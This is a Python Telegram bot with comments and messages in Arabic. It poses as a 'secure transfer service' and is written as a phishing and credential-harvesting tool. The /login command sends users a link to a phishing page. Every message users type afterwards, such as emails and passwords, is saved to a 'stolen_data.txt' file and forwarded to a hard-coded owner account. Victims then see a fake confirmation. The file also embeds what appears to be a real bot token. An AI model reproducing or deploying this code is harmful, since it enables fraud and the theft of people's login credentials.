import logging
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# تمكين تسجيل الدخول
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# عند استخدام الأمر /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("مرحباً بك في خدمة التحويل الآمن!\nاضغط /login لتبدأ عملية التحويل.")

# عند استخدام الأمر /login
async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phishing_link = "http://your-phishing-site.com/phishing.html"
    await update.message.reply_text(f"من فضلك قم بتسجيل الدخول أولاً:\n[اضغط هنا]({phishing_link})", parse_mode="Markdown")

# التقاط الرسائل النصية (مثل البريد وكلمة المرور)
async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.lower()
    user = update.effective_user

    # تسجيل البيانات المسروقة
    with open("stolen_data.txt", "a") as f:
        f.write(f"[DATA CAPTURED] User: {user} | Input: {update.message.text}\n")

    # إرسال البيانات مباشرة إلى Owner ID
    owner_id = 8114520187  # استبدل هذا بالـ ID الخاص بك
    try:
        await context.bot.send_message(chat_id=owner_id, text=f"[!] NEW DATA FROM USER: {user}\n\nInput: {update.message.text}")
    except Exception as e:
        print(f"[-] Failed to send data to owner: {e}")

    # رد عشوائي للضحية
    await update.message.reply_text("تم استلام المعلومات... سيتم تنفيذ التحويل خلال ثوانٍ ✅")

# تشغيل البوت
if __name__ == '__main__':
    bot_token = '8040958162:AAGkNbd7ePLKRzmDlxZMSCO061TjNtDdg20'  # توكن البوت الخاص بك

    application = ApplicationBuilder().token(bot_token).build()

    # الأوامر
    start_handler = CommandHandler('start', start)
    login_handler = CommandHandler('login', login)
    message_handler = MessageHandler(filters.TEXT & (~filters.COMMAND), echo)

    # إضافة الأوامر
    application.add_handler(start_handler)
    application.add_handler(login_handler)
    application.add_handler(message_handler)

    # تشغيل البوت
    print("[+] Bot is running...\n[+] Waiting for victims...")
    application.run_polling()
